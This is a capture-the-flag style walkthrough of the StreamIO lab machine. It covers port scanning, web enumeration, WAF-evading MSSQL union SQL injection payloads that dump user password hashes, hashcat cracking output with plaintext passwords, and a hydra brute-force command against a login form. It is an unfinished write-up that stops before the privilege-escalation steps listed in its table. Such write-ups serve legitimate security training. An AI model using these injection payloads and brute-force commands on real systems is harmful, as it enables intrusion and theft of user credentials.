---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# StreamIO

## Summary

[StreamIO](https://app.hackthebox.com/machines/streamio) is a <mark style="color:yellow;">medium-rated</mark> machine TBC...

<table><thead><tr><th width="84" align="right">Step</th><th width="211">Action</th><th width="225">Tool</th><th>Gained</th></tr></thead><tbody><tr><td align="right">1</td><td>Web server enumeration</td><td><a href="https://github.com/exiftool/exiftool">exiftool</a></td><td>Usernames</td></tr><tr><td align="right">2</td><td>PDF enumeration</td><td><a href="https://ss64.com/bash/bash.html">Bash</a></td><td>Usernames &#x26; Password</td></tr><tr><td align="right">3</td><td>Password spray</td><td><a href="https://x7331.gitbook.io/boxes/tools/tools/active-directory/netexec-cme">NXC</a></td><td>Credentials</td></tr><tr><td align="right">4</td><td>SMB enumeration</td><td><a href="https://x7331.gitbook.io/boxes/tools/tools/active-directory/netexec-cme">NXC</a></td><td><a data-footnote-ref href="#user-content-fn-1">EoP</a> path</td></tr><tr><td align="right">5</td><td><a data-footnote-ref href="#user-content-fn-2">EoP</a> exploitation</td><td><a href="https://github.com/dirkjanm/krbrelayx">dnstool</a>, <a href="https://github.com/SpiderLabs/Responder">responder</a></td><td><a data-footnote-ref href="#user-content-fn-3">EoP</a></td></tr><tr><td align="right">6</td><td>Domain enumeration</td><td><a href="https://x7331.gitbook.io/boxes/tools/tools/active-directory/netexec-cme">NXC</a>, <a href="https://x7331.gitbook.io/boxes/tools/tools/active-directory/bloodhound">BloodHound</a></td><td><a data-footnote-ref href="#user-content-fn-4">EoP</a> path</td></tr><tr><td align="right">7</td><td><a data-footnote-ref href="#user-content-fn-5">EoP</a> exploitation</td><td><a href="https://x7331.gitbook.io/boxes/tools/tools/active-directory/netexec-cme">NXC</a>, <a href="https://github.com/fortra/impacket">Impacket</a></td><td>Domain compromise</td></tr></tbody></table>

## Recon

### Port Scan

Let's start with a [port scan](../../../tools/tools/port-scanners/nmap.md#nmap-flow) (Figure 1).

```bash
nmap-scan.sh 10.10.10.248
Creating directory...
Performing initial scan...
Extracting ports...
Performing an aggresive scan on open ports...
All done! See results: less scans/aggressive_scan.nmap
```

<figure><img src="../../../.gitbook/assets/streamio_nmap.png" alt=""><figcaption><p>Figure 1: Ports listening on the StreamIO machine.</p></figcaption></figure>

* Based on the <mark style="color:yellow;">yellow-highlighted ports</mark>, as well as the host name (`DC`), we are dealing with a DC[^6].
* We have HTTP (`80`) and HTTPS (`443`) hosting an IIS web server. The latter also gives us an interesting DNS name: `watch.streamIO.htb`.
* WinRM (`5985`) is available to access the box in case we obtain credentials.
* The FQDN[^7] of the machine is `DC.STREAMIO.HTB`.

Before jumping on the web server, let's add the hostname (`dc`), the domain (`streamio.htb`), the FQDN (`dc.streamio.htb`), and the alternate name (`watch.streamIO.htb`) to our local DNS file.

```bash
grep stream /etc/hosts
10.10.11.158    dc dc.streamio.htb streamio.htb watch.streamio.htb
```

### Failed Ports

Attempting to enumerate SMB, RCP and LDAP without credentials does not yield anything (Figure 2). In addition, DNS also returns nothing of interest as well (Figure 3).

{% code overflow="wrap" %}
```bash
# attempting to enumerate SMB via NULL session
nxc smb 10.10.11.158 -u '' -p '' --shares
# attempting to enumerate SMB via guest session
nxc smb 10.10.11.158 -u 'guest' -p '' --shares
# attempting to enumerate SMB via anonymous session
nxc smb 10.10.11.158 -u 'x7331' -p '' --shares
# attempting to enumrating RPC via NULL session
rpcclient -U '' -N 10.10.11.158
# attempting to enumerating LDAP via NULL bind
ldapsearch -x -H ldap://streamio.htb -s sub -b 'DC=streamIO,DC=htb'
# enumerating DNS
dnsenum --dnsserver 10.10.11.158 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt streamio.htb
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/streamio_smb_ldap_rpc.png" alt=""><figcaption><p>Figure 2: Failed enumeration attempts on SMB, RPC, and LDAP.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/streamio_dns.png" alt=""><figcaption><p>Figure 3: Enumerating the DNS server.</p></figcaption></figure>

### IIS Enumeration

Checking for the technologies used we can see that PHP and ASP.NET are used. We can add those extensions to our fuzzing commands on the next step.

{% code overflow="wrap" %}
```bash
# checking technologies used on the domain
whatweb https://streamio.htb
https://streamio.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[oliver@Streamio.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.158], JQuery[3.4.1], Microsoft-IIS[10.0], PHP[7.2.26,], Script, Title[Streamio], X-Powered-By[PHP/7.2.26, ASP.NET], X-UA-Compatible[IE=edge]
# checking technologies used on the subdomain
whatweb https://watch.streamio.htb
https://watch.streamio.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.158], Microsoft-IIS[10.0], PHP[7.2.26,], Script, Title[Streamio], X-Powered-By[PHP/7.2.26, ASP.NET]
```
{% endcode %}

Browsing at `https://streamio.htb` there are 2 potential things of interest: some names and a working contact form (Figure 4).

<figure><img src="../../../.gitbook/assets/streamio_streamio.htb.png" alt=""><figcaption><p>Figure 4: The <code>https://streamio.htb</code> site.</p></figcaption></figure>

Scanning port `80` for directories, subdomains, and vhosts does not return anything interesting. However, doing the same for `443` returns many interesting directories, both for `streamio.htb` (Figure 5) and `watch.streamio.htb` (Figure 6).

{% code overflow="wrap" %}
```bash
# scanning the domain
ffuf -u https://streamio.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -ic -e .php,.aspx
# scanning the subdomain
ffuf -u https://watch.streamio.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -ic -e .php
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/streamio_fuff_domain.png" alt=""><figcaption><p>Figure 5: Dirbusting the domain.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/streamio_fuff_subdomain.png" alt=""><figcaption><p>Figure 6: Dirbusting the subdomain.</p></figcaption></figure>

## SQL Injection

Looking at `watch.streamio.htb/search.php` we find something very interesting: a search bar. Using a random string, such as "_anger_" returns all movies that contain that string, which suggests that the back-end query makes use of SQL wildcards, such as `%` or `_` (Figure 7).

<figure><img src="../../../.gitbook/assets/streamio_anger_bar.png" alt=""><figcaption><p>Figure 7: Searching for movies containing the string "<em>anger</em>".</p></figcaption></figure>

Playing around with common SQLi[^8] payloads has an interesting result: it redirects us to `/blocked.php` (Figure 8) which seems to be some kind of a WAF[^9] simulation (Figure 9).&#x20;

<figure><img src="../../../.gitbook/assets/streamio_sqli_blocked.png" alt=""><figcaption><p>Figure 8: Checking for SQLi with common payloads redirect us to <code>/blocked.php</code>.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/streamio_blocked.png" alt=""><figcaption><p>Figure 9: The <code>/blocked.php</code> directory.</p></figcaption></figure>

We can use `fuff` to [fuzz for special characters](../../../tl-dr/tl-dr/web/sqli.md#banned-characters) and see what is and what is not allowed. The `%` and `_` characters return all movies which confirms our suspicion for the use of [SQL wildcards](https://www.w3schools.com/sql/sql\_wildcards.asp) in the back-end query. The `&` also does the same, which makes sense since `ffuf` does not URL-encode it, so it is interpreted as `q=&`, which is the same as sending a blank request (Figure 9).

{% code overflow="wrap" %}
```bash
ffuf -k -u https://watch.streamio.htb/search.php -d 'q=FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -c -ic -ac -H 'Content-Type: application/x-www-form-urlencoded'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/streamio_ffuf_specialchars.png" alt=""><figcaption><p>Figure 9: Fuzzing the URL for special characters.</p></figcaption></figure>

Since this is an IIS web server, we can make the [educated guess](../../../tl-dr/tl-dr/web/sqli.md#assumptions) that we are dealing with an MSSQL database, thus, we can infer that the query must be something like this:

```sql
SELECT * FROM movies WHERE name LIKE '%anger%';
# or
SELECT * FROM movies WHERE CONTAINS (name,'*500*');
```

Since the `*` is not a banned character and we know that it treats the `%` and `_` as wildcards, we can safely pick the first version. We can test our hypotheses by trying to break the query. By injecting the `anger'-- -` payload we get back just one result; the only movie that ends with `anger` (Figure 10).&#x20;

```sql
q=anger'-- -
```

<figure><img src="../../../.gitbook/assets/streamio_sqli_anger_1.png" alt=""><figcaption><p>Figure 10: Removing the second wildcard.</p></figcaption></figure>

By injecting a wildcard at the end of the payload, i.e., `anger%'-- -`, we get many more results back, more specifically, the same number as passing just `anger` on the search bar (Figure 11).

```sql
q=anger%'-- -
```

<figure><img src="../../../.gitbook/assets/streamio_sqli_anger_2.png" alt=""><figcaption><p>Figure 11: Adding back the second wildcard manually.</p></figcaption></figure>

Typically, the first step in a SQLi attack is [enumerating the number of columns](../../../tl-dr/tl-dr/web/sqli.md#number-of-columns). This is done with either by using the `ORDER BY` or the `UNION SELECT NULL` clause, and both seemed to be blocked here (Figure 12).

```sql
q=anger' ORDER BY 1;-- -
q=anger' UNION SELECT NULL;-- -
```

<figure><img src="../../../.gitbook/assets/streamio_blocked_payloads.png" alt=""><figcaption><p>Figure 12: Common SQLi payloads are blocked by the WAF.</p></figcaption></figure>

If we replace `NULL` with `1` the payload seems to be accepted, so we will try to use that in order to enumerate the number of columns. Using it with a payload that returns movies back, such as `anger'`, does not seem to work, so we will try with something that we know that returns nothing back, like `anger1'`. By incrementing the number of columns, we get a match at `6` (Figure 13).

```sql
q=anger1' UNION SELECT 1-- -
q=anger1' UNION SELECT 1,2,3,4,5,6;-- -
```

<figure><img src="../../../.gitbook/assets/streamio_enum_num_cols.png" alt=""><figcaption><p>Figure 13: Enumerating the number of columns returned by the query.</p></figcaption></figure>

The next step in the process is to figure out which column accepts strings. We can test that by passing a string on each column and see which returns it back (Figure 14).

```sql
q=anger1' UNION SELECT 'a',2,3,4,5,6;-- -
q=anger1' UNION SELECT 1,'a',3,4,5,6;-- -
```

<figure><img src="../../../.gitbook/assets/streamio_enum_string_field.png" alt=""><figcaption><p>Figure 14: Enumerating character fields.</p></figcaption></figure>

Now we have to get some information about the database itself back. There is a handy [cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) as well as the reference guide from Microsoft that can help us do that. We will start by enumerating the DBMS[^10]'s version (Figure 15).

```sql
/* enumerate DBMS version */
q=anger1' UNION SELECT 1,@@version,3,4,5,6;--
```

<figure><img src="../../../.gitbook/assets/streamio_db_version.png" alt=""><figcaption><p>Figure 15: Enumerating the version of the DBMS.</p></figcaption></figure>

This confirms our assumption, i.e., that we are dealing a MSSQL DBMS. We can continue by listing all DBMS's databases (Figure 16).

```sql
/* enumerate DBMS's databases */
q=anger1' UNION SELECT 1,name,3,4,5,6 FROM master..sysdatabases--
```

<figure><img src="../../../.gitbook/assets/steamio_databases.png" alt=""><figcaption><p>Figure 16: Listing the databases of the DBMS. </p></figcaption></figure>

There are only 2 non-default databases returned: `streamio` and `streamio_backup`. Let's see what tables are contained within the former (Figure 17).

```sql
/* enumerate database's tables */
q=anger1' UNION SELECT 1,CONCAT(name,':',id),3,4,5,6 FROM streamio..sysobjects--
```

<figure><img src="../../../.gitbook/assets/streamio_enum_tables.png" alt=""><figcaption><p>Figure 17: Enumerating all table names and IDs from the <code>streamio</code> database.</p></figcaption></figure>

From the tables listed, `users` seems the most interesting one. We will use its id (`901578250`) to list all of its columns (Figure 18).

```sql
/* enumerate table's columns */
q=anger1' UNION SELECT 1,name,3,4,5,6 FROM streamio..syscolumns WHERE id=901578250--
```

<figure><img src="../../../.gitbook/assets/streamio_enum_columns.png" alt=""><figcaption><p>Figure 18: Listing all columns of the <code>users</code> table.</p></figcaption></figure>

There are only 4 columns within `users`; `username` and `password` seem the most logical to exfiltrate the data from (Figure 19).

{% code overflow="wrap" %}
```sql
/* exfiltrate data */
q=anger1' UNION SELECT 1,(SELECT STRING_AGG(CONCAT(username,':',password),'|') FROM users),3,4,5,6--
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/streamio_exfiltrate_data.png" alt=""><figcaption><p>Figure 19: Exfiltrating the <code>username</code> and <code>password</code> fields.</p></figcaption></figure>

### Brute-Forcing

When we copy and paste the data from Burp into a file, we will need to tidy them up in order to be in proper format (`user:hash`). Hashcat manages to crack 12 out of the total 25 hashes.&#x20;

```bash
# tidying up the data
cat db_users | tr '|' '\n' | tr -d ' ' > user_hashes
# cracking MD5 hashes
hashcat -m0 user_hashes /usr/share/wordlists/rockyou --username
<SNIP>
# listing the cracked hashes
hashcat -m0 user_hashes --username --show
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
```

Next, we can split the users and the passwords into 2 files and check if any of these is valid. Testing them against the SMB server using [NXC](../../../tools/tools/active-directory/netexec-cme.md) does not work. Our next option is to check them against the `https://streamio.htb/login.php` form we found earlier.

{% code overflow="wrap" %}
```bash
# writing the cracked hashes into a file
hashcat -m0 user_hashes --username --show > cracked_hashes
# splitting users and passwords
cat cracked_hashes | awk -F':' '{print $1}' > users
cat cracked_hashes | awk -F':' '{print $2}' > passwords
# password-spraying SMB
nxc smb 10.10.11.158 -u users -p passwords --continue-on-success
```
{% endcode %}

Burp's Intruder is slow on the free edition, so we will use `hydra` to brute-force the login form. First, we need to gather some information:

1. The HTTP method -> we know it is a `POST` request (Figure 20.1).
2. The requests parameters -> `username`, `password` (Figure 20.2).
3. Something that exists on the page only after a failed login -> `<div class="login-block">` (Figure 20.3).

<figure><img src="../../../.gitbook/assets/streamio_hydra_info.png" alt=""><figcaption><p>Figure 20: Gathering the required information for <code>hydra</code>.</p></figcaption></figure>

Passing the information to `hydra` reveals a valid pair of credentials (`yoshihide:66boysandgirls..`) after about 4 minutes (Figure 21).

{% code overflow="wrap" %}
```bash
# brute forcing the login form
hydra -L users -P passwords streamio.htb https-post-form '/login.php:username=^USER^&password=^PASS^:F=<div class="alert alert-danger">' -I
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/streamio_hydra_creds.png" alt=""><figcaption><p>Figure 21: Obtaining valid login credentials with <code>hydra</code>.</p></figcaption></figure>

[^1]: Elevation of Privileges

[^2]: Elevation of Privileges

[^3]: Elevation of Privileges

[^4]: Elevation of Privileges

[^5]: Elevation of Privileges

[^6]: Domain Controller

[^7]: Fully Qualified Domain Name

[^8]: Structured Query Language injection

[^9]: Web Application Firewall

[^10]: Database Management System
